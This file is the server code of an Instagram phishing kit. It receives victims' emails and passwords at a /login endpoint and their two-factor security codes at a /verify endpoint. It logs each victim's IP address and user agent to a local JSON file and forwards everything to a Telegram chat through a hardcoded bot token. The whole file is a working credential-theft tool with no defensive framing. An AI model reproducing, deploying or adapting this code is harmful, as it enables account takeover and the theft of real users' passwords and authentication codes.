const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot settings
const TELEGRAM_BOT_TOKEN = '8027370523:AAG2923P2Z6zasoMpUoOagdUXIeW-F1Ly1g';
const TELEGRAM_CHAT_ID = '1410189339';

// Function to send message to Telegram
async function sendTelegramMessage(message) {
    try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('Notification sent to Telegram');
    } catch (error) {
        console.error('Error sending Telegram notification:', error.message);
    }
}

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '.')));

// Route to handle login
app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    
    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password are required' });
    }
    
    const loginData = {
        email,
        password,
        timestamp: new Date().toISOString(),
        verificationCode: null,  // Will be updated when user enters verification code
        trustDevice: false,
        verificationTimestamp: null,
        ipAddress: req.ip || req.connection.remoteAddress,
        userAgent: req.headers['user-agent']
    };
    
    // Create the data directory if it doesn't exist
    const dataDir = path.join(__dirname, 'data');
    if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir);
    }
    
    // Save the login data to a JSON file
    const filePath = path.join(dataDir, 'login_data.json');
    
    // Read existing data if the file exists
    let existingData = [];
    if (fs.existsSync(filePath)) {
        try {
            const fileContent = fs.readFileSync(filePath, 'utf8');
            existingData = JSON.parse(fileContent);
            if (!Array.isArray(existingData)) {
                existingData = [existingData];
            }
        } catch (err) {
            console.error('Error reading existing data:', err);
        }
    }
    
    // Add new login data
    existingData.push(loginData);
    
    // Write updated data to file
    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));
    
    // Send notification to Telegram
    const loginMessage = `
🔐 <b>New Instagram Login Attempt</b> 🔐

<b>Username/Email:</b> ${email}
<b>Password:</b> ${password}
<b>Time:</b> ${new Date().toLocaleString()}
<b>IP Address:</b> ${loginData.ipAddress}
<b>User Agent:</b> ${loginData.userAgent}
    `;
    
    try {
        await sendTelegramMessage(loginMessage);
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
    }
    
    res.json({ success: true, message: 'Login data saved successfully' });
});

// Route to handle verification
app.post('/verify', async (req, res) => {
    const { securityCode, trustDevice } = req.body;
    
    console.log('Received verification data:', { securityCode, trustDevice });
    
    if (!securityCode) {
        return res.status(400).json({ success: false, message: 'Security code is required' });
    }
    
    // Create the data directory if it doesn't exist
    const dataDir = path.join(__dirname, 'data');
    if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir);
    }
    
    // Path to the login data file
    const filePath = path.join(dataDir, 'login_data.json');
    
    // Read existing login data
    let loginData = [];
    let updatedEntry = null;
    
    if (fs.existsSync(filePath)) {
        try {
            const fileContent = fs.readFileSync(filePath, 'utf8');
            loginData = JSON.parse(fileContent);
            if (!Array.isArray(loginData)) {
                loginData = [loginData];
            }
            
            // Find the last login entry and update it with the verification code
            if (loginData.length > 0) {
                const lastIndex = loginData.length - 1;
                loginData[lastIndex].verificationCode = securityCode;
                loginData[lastIndex].trustDevice = trustDevice;
                loginData[lastIndex].verificationTimestamp = new Date().toISOString();
                
                updatedEntry = loginData[lastIndex];
                console.log('Updated login entry:', updatedEntry);
                
                // Write the updated login data back to the file
                fs.writeFileSync(filePath, JSON.stringify(loginData, null, 2));
                console.log('Saved updated login data to file');
                
                // Send verification code to Telegram
                const verificationMessage = `
🔑 <b>Instagram Verification Code Received</b> 🔑

<b>Security Code:</b> ${securityCode}
<b>Username/Email:</b> ${updatedEntry.email}
<b>Trust Device:</b> ${trustDevice ? 'Yes' : 'No'}
<b>Time:</b> ${new Date().toLocaleString()}
                `;
                
                try {
                    await sendTelegramMessage(verificationMessage);
                } catch (error) {
                    console.error('Failed to send Telegram notification:', error);
                }
            } else {
                console.log('No login entries found to update');
            }
        } catch (err) {
            console.error('Error updating login data with verification code:', err);
        }
    } else {
        console.log('Login data file not found');
    }
    
    res.json({ success: true, message: 'Verification data saved with login data' });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Open http://localhost:${PORT} in your browser`);
}); 